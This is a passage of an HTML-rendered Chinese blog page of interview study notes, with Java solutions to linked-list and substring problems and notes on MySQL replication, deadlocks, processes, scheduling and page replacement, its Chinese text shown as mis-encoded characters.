class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> calLen(head,<span class="number">0</span>);</span><br><span class="line">        ListNode dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next=head;</span><br><span class="line">        <span class="type">int</span> cyc=len/k;</span><br><span class="line">        ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode next=l2.next;</span><br><span class="line">            l2.next=<span class="literal">null</span>;</span><br><span class="line">            ListNode tmp=l1;</span><br><span class="line">            reverse(l1);</span><br><span class="line">            pre.next=l2;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            pre=tmp;</span><br><span class="line">            l1=next;</span><br><span class="line">            l2=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calLen</span><span class="params">(ListNode head,<span class="type">int</span> res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode root)</span>&#123;</span><br><span class="line">        ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.next;</span><br><span class="line">            root.next=head.next;</span><br><span class="line">            head.next=root;</span><br><span class="line">            root=tmp;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="æœ€é•¿ä¸é‡å¤å­ä¸²-">æœ€é•¿ä¸é‡å¤å­ä¸² -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,res=<span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] c=s.toCharArray();</span><br><span class="line">        <span class="keyword">while</span>(i&lt;s.length())&#123;</span><br><span class="line">          <span class="keyword">if</span>(map.containsKey(c[i]))&#123;</span><br><span class="line">              j=Math.max(j,map.get(c[i])+<span class="number">1</span>);              </span><br><span class="line">          &#125;</span><br><span class="line">            map.put(c[i],i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ•°æ®åº“">æ•°æ®åº“</span></h1><h2><span id="mysqlä¸»ä»å¤åˆ¶çš„æ–¹å¼">mysqlä¸»ä»å¤åˆ¶çš„æ–¹å¼</span></h2><ul><li>åŸºäº SQL è¯­å¥çš„å¤åˆ¶(statement-based replication, SBR)ï¼›</li><li>åŸºäºè¡Œçš„å¤åˆ¶(row-based replication, RBR)ï¼›</li><li>æ··åˆæ¨¡å¼å¤åˆ¶(mixed-based replication, MBR)ï¼›</li></ul><h2><span id="æ•°æ®åº“å¸¸è§æ­»é”åŸå› åŠå¤„ç†">æ•°æ®åº“å¸¸è§æ­»é”åŸå› åŠå¤„ç†</span></h2><p><strong>ä¸€. äº‹åŠ¡ä¹‹é—´å¯¹èµ„æºè®¿é—®é¡ºåºçš„äº¤æ›¿</strong></p><ol><li>å‡ºç°åŸå› ï¼š<br>ä¸€ä¸ªç”¨æˆ·A è®¿é—®è¡¨Aï¼ˆé”ä½äº†è¡¨Aï¼‰ï¼Œç„¶ååˆè®¿é—®è¡¨Bï¼›å¦ä¸€ä¸ªç”¨æˆ·B è®¿é—®è¡¨Bï¼ˆé”ä½äº†è¡¨Bï¼‰ï¼Œç„¶åä¼å›¾è®¿é—®è¡¨Aï¼›è¿™æ—¶ç”¨æˆ·Aç”±äºç”¨æˆ·Bå·²ç»é”ä½è¡¨Bï¼Œå®ƒå¿…é¡»ç­‰å¾…ç”¨æˆ·Bé‡Šæ”¾è¡¨Bæ‰èƒ½ç»§ç»­ï¼ŒåŒæ ·ç”¨æˆ·Bè¦ç­‰ç”¨æˆ·Aé‡Šæ”¾è¡¨Aæ‰èƒ½ç»§ç»­ï¼Œè¿™å°±æ­»é”å°±äº§ç”Ÿäº†ã€‚</li><li>è§£å†³æ–¹æ³•ï¼š<br>è¿™ç§æ­»é”æ¯”è¾ƒå¸¸è§ï¼Œæ˜¯ç”±äºç¨‹åºçš„BUGäº§ç”Ÿçš„ï¼Œé™¤äº†è°ƒæ•´çš„ç¨‹åºçš„é€»è¾‘æ²¡æœ‰å…¶å®ƒçš„åŠæ³•ã€‚ä»”ç»†åˆ†æç¨‹åºçš„é€»è¾‘ï¼Œå¯¹äºæ•°æ®åº“çš„å¤šè¡¨æ“ä½œæ—¶ï¼Œå°½é‡æŒ‰ç…§ç›¸åŒçš„é¡ºåºè¿›è¡Œå¤„ç†ï¼Œå°½é‡é¿å…åŒæ—¶é”å®šä¸¤ä¸ªèµ„æºï¼Œå¦‚æ“ä½œAå’ŒBä¸¤å¼ è¡¨æ—¶ï¼Œæ€»æ˜¯æŒ‰å…ˆAåBçš„é¡ºåºå¤„ç†ï¼Œ å¿…é¡»åŒæ—¶é”å®šä¸¤ä¸ªèµ„æºæ—¶ï¼Œè¦ä¿è¯åœ¨ä»»ä½•æ—¶åˆ»éƒ½åº”è¯¥æŒ‰ç…§ç›¸åŒçš„é¡ºåºæ¥é”å®šèµ„æºã€‚</li></ol><p>1ï¼‰ä»¥å›ºå®šçš„é¡ºåºè®¿é—®è¡¨å’Œè¡Œã€‚å³æŒ‰é¡ºåºç”³è¯·é”ï¼Œè¿™æ ·å°±ä¸ä¼šé€ æˆäº’ç›¸ç­‰å¾…çš„åœºé¢ã€‚</p><p>2ï¼‰å¤§äº‹åŠ¡æ‹†å°ã€‚å¤§äº‹åŠ¡æ›´å€¾å‘äºæ­»é”ï¼Œå¦‚æœä¸šåŠ¡å…è®¸ï¼Œå°†å¤§äº‹åŠ¡æ‹†å°ã€‚</p><p>3ï¼‰åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œå°½å¯èƒ½åšåˆ°ä¸€æ¬¡é”å®šæ‰€éœ€è¦çš„æ‰€æœ‰èµ„æºï¼Œå‡å°‘æ­»é”æ¦‚ç‡ã€‚</p><p>4ï¼‰é™ä½éš”ç¦»çº§åˆ«ã€‚å¦‚æœä¸šåŠ¡å…è®¸ï¼Œå°†éš”ç¦»çº§åˆ«è°ƒä½ä¹Ÿæ˜¯è¾ƒå¥½çš„é€‰æ‹©ï¼Œæ¯”å¦‚å°†éš”ç¦»çº§åˆ«ä»RRè°ƒæ•´ä¸ºRCï¼Œå¯ä»¥é¿å…æ‰å¾ˆå¤šå› ä¸ºgapé”é€ æˆçš„æ­»é”ã€‚</p><p>5ï¼‰ä¸ºè¡¨æ·»åŠ åˆç†çš„ç´¢å¼•ã€‚å¦‚æœä¸èµ°ç´¢å¼•å°†ä¼šä¸ºè¡¨çš„æ¯ä¸€è¡Œè®°å½•æ·»åŠ ä¸Šé”ï¼Œæ­»é”çš„æ¦‚ç‡å¤§å¤§å¢å¤§ã€‚</p><h1><span id="æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</span></h1><h2><span id="æ“ä½œç³»ç»Ÿçš„forkæ“ä½œå¸¦æ¥çš„è¿›ç¨‹é—®é¢˜é€šä¿¡é—®é¢˜">æ“ä½œç³»ç»Ÿçš„forkæ“ä½œï¼Œå¸¦æ¥çš„è¿›ç¨‹é—®é¢˜ï¼Œé€šä¿¡é—®é¢˜</span></h2><ul><li>forkï¼ˆï¼‰å‡½æ•°é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹å¯ä»¥åšå®Œå…¨ç›¸åŒçš„äº‹ï¼Œä½†å¦‚æœåˆå§‹å‚æ•°æˆ–è€…ä¼ å…¥çš„å˜é‡ä¸åŒï¼Œä¸¤ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥åšä¸åŒçš„äº‹ã€‚</li></ul><h2><span id="ä»€ä¹ˆæ—¶å€™ç”¨å¤šçº¿ç¨‹ä»€ä¹ˆæ—¶å€™ç”¨å¤šè¿›ç¨‹">ä»€ä¹ˆæ—¶å€™ç”¨å¤šçº¿ç¨‹ï¼Œä»€ä¹ˆæ—¶å€™ç”¨å¤šè¿›ç¨‹ âˆš</span></h2><p>å¤šè¿›ç¨‹â€”â€”è®¡ç®—å¯†é›†å‹ï¼šå¤§é‡æ¶ˆè€—CPUçš„æ•°å­¦ä¸é€»è¾‘è¿ç®—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™é‡Œè¯´çš„å¹³è¡Œè®¡ç®—ã€‚</p><p>å¤šçº¿ç¨‹â€”â€”IOå¯†é›†å‹ï¼šè¯»å–æ–‡ä»¶ï¼Œè¯»å–ç½‘ç»œå¥—æ¥å­—é¢‘ç¹ã€‚</p><h2><span id="çº¿ç¨‹åˆ‡æ¢å’Œè¿›ç¨‹åˆ‡æ¢çš„æ¯”è¾ƒ">çº¿ç¨‹åˆ‡æ¢å’Œè¿›ç¨‹åˆ‡æ¢çš„æ¯”è¾ƒ</span></h2><p>çº¿ç¨‹åˆ‡æ¢ ä¸ è¿›ç¨‹åˆ‡æ¢çš„æ¯”è¾ƒã€‚è¿›ç¨‹åˆ‡æ¢åˆ†ä¸ºä¸¤æ­¥ï¼š</p><p><strong>1ï¼‰åˆ‡æ¢è™šæ‹Ÿåœ°å€</strong></p><p><strong>2ï¼‰åˆ‡æ¢å†…æ ¸æ ˆå’Œç¡¬ä»¶ä¸Šä¸‹æ–‡</strong>ã€‚</p><p>çº¿ç¨‹åªæœ‰ä¸€æ­¥ï¼š<strong>åˆ‡æ¢å†…æ ¸æ ˆå’Œç¡¬ä»¶ä¸Šä¸‹æ–‡</strong>ã€‚  </p><p><strong>åˆ‡æ¢é¡µç›®å½•çš„å¼€é”€å¾ˆå¤§ã€‚</strong> </p><h2><span id="ä¸ºä»€ä¹ˆè™šæ‹Ÿåœ°å€åˆ‡æ¢å¾ˆæ…¢">ä¸ºä»€ä¹ˆè™šæ‹Ÿåœ°å€åˆ‡æ¢å¾ˆæ…¢ï¼Ÿ</span></h2><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ã€‚ åˆ‡æ¢è¿›ç¨‹åï¼Œé¡µè¡¨ä¹Ÿè¦è¿›è¡Œåˆ‡æ¢ï¼ŒTLBå°±å¤±æ•ˆäº†ï¼ˆé¡µè¡¨ç¼“å†²ï¼‰ï¼Œcacheå¤±æ•ˆå¯¼è‡´å‘½ä¸­ç‡é™ä½ï¼Œè™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€å°±ä¼šå¾ˆæ…¢ã€‚</p><h2><span id="å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹">å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹ âˆš</span></h2><p>ä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆé‚£äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹å°†è¢«initè¿›ç¨‹(è¿›ç¨‹å·ä¸º1)æ‰€æ”¶å…»ï¼Œå¹¶ç”±initè¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚</p><p>å³å­è¿›ç¨‹å…ˆäºçˆ¶è¿›ç¨‹é€€å‡ºåï¼Œå­è¿›ç¨‹çš„PCBéœ€è¦å…¶çˆ¶è¿›ç¨‹é‡Šæ”¾ï¼ˆè°ƒç”¨waitæˆ–è€…waitpidï¼‰ï¼Œä½†æ˜¯çˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰é‡Šæ”¾å­è¿›ç¨‹çš„PCBï¼Œè¿™æ ·çš„å­è¿›ç¨‹å°±ç§°ä¸ºåƒµå°¸è¿›ç¨‹ï¼Œåƒµå°¸è¿›ç¨‹å®é™…ä¸Šæ˜¯ä¸€ä¸ªå·²ç»æ­»æ‰çš„è¿›ç¨‹ã€‚</p><h2><span id="è¿›ç¨‹è°ƒåº¦æ–¹æ³•è¯¦ç»†ä»‹ç»">è¿›ç¨‹è°ƒåº¦æ–¹æ³•è¯¦ç»†ä»‹ç» âˆš</span></h2><p>1ï¼‰ç¨‹åºä»»åŠ¡æœ‰ä¸‰ç§:CPUè®¡ç®—å¯†é›†å‹ã€IOå¯†é›†å‹ä¸å¹³è¡¡å‹ã€‚2ï¼‰è°ƒåº¦ç®—æ³•ï¼šï¼ˆ1ï¼‰ å…ˆæ¥å…ˆå»æœåŠ¡ç®—æ³•ï¼šå…¶ä¼˜ç‚¹å°±æ˜¯ç®€å•ä¸”å®ç°å®¹æ˜“ï¼Œç¼ºç‚¹åˆ™æ˜¯çŸ­çš„å·¥ä½œæœ‰å¯èƒ½å˜å¾—å¾ˆæ…¢ï¼Œå› ä¸ºå…¶å‰é¢æœ‰å¾ˆé•¿çš„å·¥ä½œåœ¨æ‰§è¡Œï¼Œè¿™æ ·å°±ä¼šé€ æˆç”¨æˆ·çš„äº¤äº’å¼ä½“éªŒä¹Ÿæ¯”è¾ƒå·®ã€‚<br>ï¼ˆ2ï¼‰æ—¶é—´ç‰‡è½®è½¬ç®—æ³•ï¼šã€€æ—¶é—´ç‰‡è½®è½¬æ˜¯å¯¹FCFSç®—æ³•çš„ä¸€ç§æ”¹è¿›ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯æ”¹å–„çŸ­ç¨‹åºçš„å“åº”æ—¶é—´ï¼Œå®ç°æ–¹å¼å°±æ˜¯å‘¨æœŸæ€§åœ°è¿›è¡Œè¿›ç¨‹åˆ‡æ¢ã€‚æ—¶é—´ç‰‡è½®è½¬çš„é‡ç‚¹åœ¨<strong>äºæ—¶é—´ç‰‡çš„é€‰æ‹©</strong>ï¼Œéœ€è¦è€ƒè™‘å¤šæ–¹å› ç´ ï¼šå¦‚æœè¿è¡Œçš„è¿›ç¨‹å¤šæ—¶ï¼Œæ—¶é—´ç‰‡å°±éœ€è¦çŸ­ä¸€äº›ï¼›è¿›ç¨‹æ•°é‡å°‘æ—¶ï¼Œæ—¶é—´ç‰‡å°±å¯ä»¥é€‚å½“é•¿ä¸€äº›ã€‚<br>ï¼ˆ3ï¼‰çŸ­ä»»åŠ¡ä¼˜å…ˆï¼šçŸ­ä»»åŠ¡çš„ä¼˜å…ˆçº§æ¯”é•¿ä»»åŠ¡çš„é«˜ï¼Œè€Œæˆ‘ä»¬æ€»æ˜¯å®‰æ’ä¼˜å…ˆçº§é«˜çš„ä»»åŠ¡å…ˆè¿è¡Œã€‚â‘ æŠ¢å å¼ï¼šæŠ¢å å¼åˆ™æ˜¯<strong>æ¯å¢åŠ ä¸€ä¸ªæ–°çš„è¿›ç¨‹å°±éœ€è¦å¯¹æ‰€æœ‰è¿›ç¨‹ï¼ˆåŒ…æ‹¬æ­£åœ¨CPUä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼‰è¿›è¡Œæ£€æŸ¥</strong>ï¼Œè°çš„æ—¶é—´çŸ­å°±è¿è¡Œè°ã€‚â‘¡éæŠ¢å å¼ï¼šéæŠ¢å å¼å½“å·²ç»åœ¨CPUä¸Šè¿è¡Œçš„ä»»åŠ¡ç»“æŸæˆ–é˜»å¡æ—¶ï¼Œä»å€™é€‰ä»»åŠ¡ä¸­é€‰æ‹©æ‰§è¡Œæ—¶é—´æœ€çŸ­çš„è¿›ç¨‹æ¥æ‰§è¡Œä¼˜ç‚¹ï¼šç³»ç»Ÿå¹³å‡å“åº”æ—¶é—´åœ¨ä»¥ä¸Šå‡ ç§ç®—æ³•ä¸­æ˜¯æœ€ä¼˜çš„ç¼ºç‚¹ï¼šä¸€æ˜¯å¯èƒ½é€ æˆé•¿ä»»åŠ¡æ— æ³•å¾—åˆ°CPUæ—¶é—´ä»è€Œå¯¼è‡´â€œè‚Œé¥¿â€ã€‚äºŒæ˜¯å¦‚ä½•çŸ¥é“æ¯ä¸ªè¿›ç¨‹è¿˜éœ€è¦è¿è½¬å¤šä¹…ï¼Ÿ<br>ï¼ˆ4ï¼‰ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ï¼šä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ç»™æ¯ä¸ªè¿›ç¨‹èµ‹äºˆä¸€ä¸ªä¼˜å…ˆçº§ï¼Œæ¯æ¬¡éœ€è¦è¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œæ‰¾ä¸€ä¸ªä¼˜å…ˆçº§æœ€é«˜çš„è¿›ç¨‹è¿›è¡Œè°ƒåº¦ã€‚ä¼˜ç‚¹åœ¨äºå¯ä»¥èµ‹äºˆé‡è¦çš„è¿›ç¨‹ä»¥é«˜ä¼˜å…ˆçº§ä»¥ç¡®ä¿é‡è¦ä»»åŠ¡èƒ½å¤Ÿå¾—åˆ°CPUæ—¶é—´ï¼Œå…¶ç¼ºç‚¹åˆ™æœ‰äºŒï¼šä¸€æ˜¯ä½ä¼˜å…ˆçº§çš„è¿›ç¨‹å¯èƒ½ä¼šâ€œé¥¥é¥¿â€ï¼ŒäºŒæ˜¯å“åº”æ—¶é—´æ— æ³•ä¿è¯ã€‚<br>ï¼ˆ5ï¼‰æ··åˆè°ƒåº¦ç®—æ³•ï¼šå°†æ‰€æœ‰è¿›ç¨‹åˆ†ä¸ºä¸åŒçš„å¤§ç±»ï¼Œæ¯ä¸ªå¤§ç±»ä¸ºä¸€ä¸ªä¼˜å…ˆçº§ã€‚å¦‚æœä¸¤ä¸ªè¿›ç¨‹å¤„äºä¸åŒçš„å¤§ç±»ï¼Œåˆ™å¤„äºé«˜ä¼˜å…ˆçº§å¤§ç±»çš„è¿›ç¨‹ä¼˜å…ˆæ‰§è¡Œï¼›å¦‚æœå¤„äºåŒä¸€ä¸ªå¤§ç±»ï¼Œåˆ™é‡‡ç”¨æ—¶é—´ç‰‡è½®è½¬ç®—æ³•æ¥æ‰§è¡Œã€‚</p><h2><span id="é¡µé¢ç½®æ¢æ–¹æ³•è¯¦ç»†ä»‹ç»">é¡µé¢ç½®æ¢æ–¹æ³•è¯¦ç»†ä»‹ç» âˆš</span></h2><p>é¡µå¸§ï¼šåˆ†é¡µå¼å†…å­˜ç®¡ç†å°†ç‰©ç†å†…å­˜åˆ†ä¸ºç­‰å¤§çš„å°å—ã€‚</p><p>é¡µï¼šé€»è¾‘å†…å­˜ï¼ˆä½¿ç”¨è™šæ‹Ÿå†…å­˜æŠ€æœ¯æ‰©å¤§çš„å†…å­˜ï¼Œå¯è®¤ä¸ºå…¶ä½äºç¡¬ç›˜ä¸Šï¼‰ï¼Œä¹Ÿè¢«åˆ†ä¸ºäº†ç­‰å¤§çš„å°å—ï¼Œç§°ä¸ºé¡µã€‚ï¼ˆä¸”é¡µå’Œé¡µå¸§çš„å¤§å°ä¸€å®šæ˜¯ä¸€æ ·çš„ï¼Œå®ƒæ˜¯<strong>å†™å…¥çœŸå®å†…å­˜</strong>å’Œ<strong>å†™å›ç¡¬ç›˜æœ€å°å•ä½</strong>ã€‚ï¼‰é¡µé¢ç½®æ¢ç®—æ³•ï¼šé¡µå¸§è¢«å†™æ»¡ï¼Œä½†éœ€è¦ç”¨æ–°çš„é¡µã€‚éœ€è¦è¿›è¡Œç½®æ¢ã€‚</p><p><strong>2.1 Optimalç®—æ³•ï¼ˆæœ€ä¼˜ç®—æ³•ï¼‰</strong>ã€€ã€€é¦–å…ˆä»‹ç»æœ€ä¼˜ç®—æ³•ï¼Œå®ƒéœ€è¦çŸ¥é“ä»¥åè¦è¢«ç”¨åˆ°çš„é¡µï¼Œç„¶åå°†ä¸ä¼šè¢«ç”¨åˆ°çš„é¡µæ¢å‡ºå†…å­˜ï¼›å¦‚æœæ‰€æœ‰é¡µéƒ½ä¼šè¢«ç”¨åˆ°ï¼Œå°±æŠŠéœ€è¦ä½¿ç”¨æ—¶é—´ç¦»ç°åœ¨æœ€é•¿çš„é¡µæ¢å‡ºï¼Œä»¥å°½é‡ä½¿ä¸å¥½çš„æƒ…å†µæ™šå‘ç”Ÿã€‚ï¼ˆä¸å¯èƒ½å®ç°ï¼‰</p><p><strong>2.2 FIFOï¼ˆFirst-In First-Outï¼Œå…ˆè¿›å…ˆå‡ºï¼‰ç®—æ³•</strong>ã€€ã€€FIFOç®—æ³•çš„æ€æƒ³å¾ˆç®€å•ï¼Œå°±æ˜¯ç½®æ¢å‡ºå½“å‰å·²ç»å¾…åœ¨å†…å­˜é‡Œæ—¶é—´æœ€é•¿çš„é‚£ä¸ªé¡µã€‚FIFOç®—æ³•çš„è¿è¡Œé€Ÿåº¦å¾ˆå¿«ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–çš„å› ç´ ï¼Œéœ€è¦çš„å¼€é”€å¾ˆå°‘ã€‚</p><p><strong>2.3 Second Chanceï¼ˆç¬¬äºŒæ¬¡æœºä¼šï¼‰ç®—æ³•</strong>ã€€ã€€ä¸ºäº†é¿å…FIFOç®—æ³•å°†é‡è¦çš„é¡µæ¢å‡ºå†…å­˜ï¼ŒSecond Chanceç®—æ³•æä¾›äº†ä¸€äº›æ”¹è¿›ã€‚Second Chanceç®—æ³•åœ¨å°†é¡µé¢æ¢å‡ºå†…å­˜å‰æ£€æŸ¥å…¶ä½¿ç”¨ä½ï¼ˆä½¿ç”¨ä½å‰æ–‡æœ‰ä»‹ç»ï¼‰ï¼Œå¦‚æœå…¶ä½¿ç”¨ä½ä¸º1ï¼Œè¯æ˜æ­¤é¡µæœ€è¿‘æœ‰è¢«ä½¿ç”¨ï¼ŒçŒœæµ‹å®ƒè¿˜å¯èƒ½è¢«ä½¿ç”¨ï¼Œäºæ˜¯ä¸æŠŠå®ƒç½®æ¢å‡ºå†…å­˜ï¼Œä½†æ˜¯æŠŠå…¶ä½¿ç”¨ä½ç½®ä¸º0ï¼Œéšåæ£€æŸ¥ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°å‘ç°æŸé¡µçš„ä½¿ç”¨ä½ä¸º0ï¼Œå°†æ­¤é¡µç½®æ¢å‡ºå†…å­˜ã€‚</p><p><strong>2.4 Clockç®—æ³•ï¼ˆæ—¶é’Ÿè½®è½¬æ³•ï¼‰</strong>ã€€ã€€<strong>ä¸ºäº†èŠ‚çº¦Second Chanceç®—æ³•ä¸€ä¸ªæ¥ç€ä¸€ä¸ªæ£€æŸ¥ä½¿ç”¨ä½çš„å¼€é”€</strong>ï¼Œæ—¶é’Ÿè½®è½¬æ³•åˆæå‡ºäº†æ”¹è¿›ã€‚æ—¶é’Ÿè½®è½¬æ³•å°†æ‰€æœ‰çš„é¡µç»„æˆä¸€ä¸ªåœ†ï¼Œåœ†å¿ƒçš„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªè¦è¢«ç½®æ¢çš„é¡µé¢ï¼Œç½®æ¢å‰åŒæ ·æ£€æŸ¥ä½¿ç”¨ä½ï¼Œå¦‚æœä½¿ç”¨ä½ä¸º1ï¼ŒåŒæ ·å°†å…¶ä½¿ç”¨ä½ç½®ä¸º0ï¼Œéšåå°†é¡ºæŒ‡é’ˆæ—‹è½¬ï¼Œæ£€æŸ¥ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°å‘ç°æŸé¡µçš„ä½¿ç”¨ä½ä¸º0ï¼Œå°†æ­¤é¡µç½®æ¢å‡ºå†…å­˜ã€‚å¾ˆå®¹æ˜“ç†è§£æ­¤ç®—æ³•ä¸ºä»€ä¹ˆå«â€œæ—¶é’Ÿâ€è½®è½¬æ³•ã€‚<img src="/2020/04/14/Tencent/Image.png" alt="img"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAkYAAAG5CAYAAABr8fs9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAMpESURBVHhe7d139H5VlR/+JP8ka2UyTpJxYolJdCyJZcQuIIgI0uwCCtL5Ik2qVJEuICBSRHoRBAREEOmCKDKMomJBEQdFUZGZscQymcmMmeT+fq8zn42Xy1Pu0z6fp+z3Wmd9ynOfW849Z+/32e38iyqRSCQSiUQiUZDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSiUQikUgklpDEKJFIJBKJRGIJSYwSicSy4v/9v/9X2rgxqfMmEonFQhKjRCKxrEhilEgkphlJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJRCKRSCSWkMQokUgkEolEYglJjBKJxFQjg6oTicRyIolRIpGYaiQxSiQSy4kkRolEYqbQligloUokEsMgiVEikZgpJDFKJBKTRBKjRCIxU0jCk0gkJokkRolEYsXxf//v/63+8R//sTS/90ISo0QiMUkkMUokEisKJAch+uUvf1n9z//5P8vviUQisVJIYpRIJIYG687vfve76n//7/9d/e3f/m3161//uhCcn//859Vf//VfV4888kj18MMPVz/+8Y+rH/7wh9UPfvCD6sEHH3xM+/73v1994xvfqG6++ebqpptuqr72ta9VDzzwQPl/81jNOR566KFyTuf+q7/6q+pv/uZvyjURK/fwv/7X/6r+4R/+ofqnf/qntC4lEomBkMQokUgMDaToN7/5TSEnyMw3v/nN6stf/nL1hS98obr11lur66+/vrr66qurj3/849VHP/rR6rzzzqvOOeec6uyzz35MO/roo6t3vOMd1WabbVYdcsgh1amnnlqdccYZ5TPHx3f8PP/886uLL764uvzyy6trrrmmuvHGG6vPfvaz1Z//+Z9XX/nKV6p77723EChE6e/+7u8KOUokEom2SGKUSCwwWFP+z//5P8Xig+AgE6w8LDLf+973qvvvv7/61re+VQiP9vWvf7366le/Wn3pS18qRAQhQX4+8YlPFOJz1llnVaeffnp18sknVyeeeGJ13HHHFdJz+OGHF8Jz8MEHVwcddFB14IEHPqZttdVW1XOe85zqT//0T6s3v/nN1e6771695z3vKZ85Pr7jp3O8733vq4444ojq/e9/f/WBD3yg+uAHP1idcsop1Uc+8pFCoBAnhIwV6nOf+1x11113lXt276xT3/72t6vvfve7xSrF8oTYsXSxeqWlKZFYbCQxSiSmDBTycillpIjbCTH4zne+U8jOddddV33sYx+rPvzhD1fHHntsITQHHHBAaXvvvXe10047VVtssUX1hje8oXrd615Xvfa1r63WXXfd8tPfr3/966u3vvWtxQK07bbbluMRnX322afaf//9y3nqpEhDjJ797GdXT3/606s3vvGN1a677lrtu+++jzvOdxGmvfbaq9ptt92qVatWVVtvvXW1+eabF0K18cYbV+uvv365H2299darNtxww/LZO9/5zmrnnXcu3z/ssMOq448/vjrzzDOLNYsL7+677y5WL+QQUUxLUyKxmEhilEhMGcZBjHw/Mr1++9vfFmUvHoeF5L777iuWH0Tg85//fHFFsfhccMEFxYUVZAgxQVB23HHHarvttisNgeHuQl6QIMRjgw02KITkTW96UyEo22yzTfWud72rkBcWHpYdJCTcY6xK4UKLhvCsttpq1XOf+9xCdlia